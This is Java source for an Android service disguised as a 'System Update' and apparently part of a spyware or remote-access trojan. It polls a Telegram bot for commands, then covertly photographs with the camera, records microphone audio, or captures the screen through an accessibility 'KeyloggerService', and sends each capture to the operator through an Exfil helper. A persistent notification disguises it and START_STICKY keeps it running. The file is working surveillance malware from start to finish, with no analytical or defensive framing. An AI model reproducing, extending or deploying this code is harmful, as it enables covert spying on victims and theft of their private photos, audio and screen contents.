package com.sys.updater;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class TelegramService extends Service {
    private long lastUpdateId = 0;
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "sys")
                    .setContentTitle("System Update")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
            startForeground(1, notification);
        }
        
        // PING bach n3erfo wach l'app bdat
        Exfil.send("✅ System Bot is Online. Send /cam, /mic, or /screenshot");
        
        new Thread(this::pollTelegram).start();
    }

    private void pollTelegram() {
        while (isRunning) {
            try {
                String urlStr = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                InputStream is = new URL(urlStr).openStream();
                java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
                String response = s.hasNext() ? s.next() : "";
                
                JSONObject json = new JSONObject(response);
                if (json.getBoolean("ok")) {
                    JSONArray result = json.getJSONArray("result");
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id");
                        if (update.has("message")) {
                            String text = update.getJSONObject("message").optString("text", "");
                            handleCommand(text);
                        }
                    }
                }
                Thread.sleep(2000);
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void handleCommand(String cmd) {
        if (cmd.equals("/cam")) {
            takePhoto();
        } else if (cmd.equals("/mic")) {
            recordAudio();
        } else if (cmd.equals("/screenshot")) {
            if (KeyloggerService.instance != null) {
                Exfil.send("📸 Capturing screen...");
                KeyloggerService.instance.captureScreen();
            } else {
                Exfil.send("⚠️ Accessibility Service is OFF. Please enable it.");
            }
        }
    }

    private void takePhoto() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                        camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(reader.getSurface());
                                    session.capture(builder.build(), null, null);
                                    
                                    reader.setOnImageAvailableListener(r -> {
                                        Image image = r.acquireLatestImage();
                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                        byte[] bytes = new byte[buffer.remaining()];
                                        buffer.get(bytes);
                                        try {
                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
                                            FileOutputStream fos = new FileOutputStream(f);
                                            fos.write(bytes);
                                            fos.close();
                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", "Camera Capture");
                                        } catch (Exception e) {}
                                        image.close();
                                        camera.close();
                                    }, null);
                                } catch (Exception e) {}
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
                        }, null);
                    } catch (Exception e) {}
                }
                @Override public void onDisconnected(CameraDevice camera) {}
                @Override public void onError(CameraDevice camera, int error) {}
            }, null);
        } catch (Exception e) {}
    }

    private void recordAudio() {
        try {
            File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Exfil.send("🎙️ Recording 10s...");
            
            new Thread(() -> {
                try { Thread.sleep(10000); } catch (Exception e) {}
                recorder.stop();
                recorder.release();
                Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record");
            }).start();
        } catch (Exception e) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
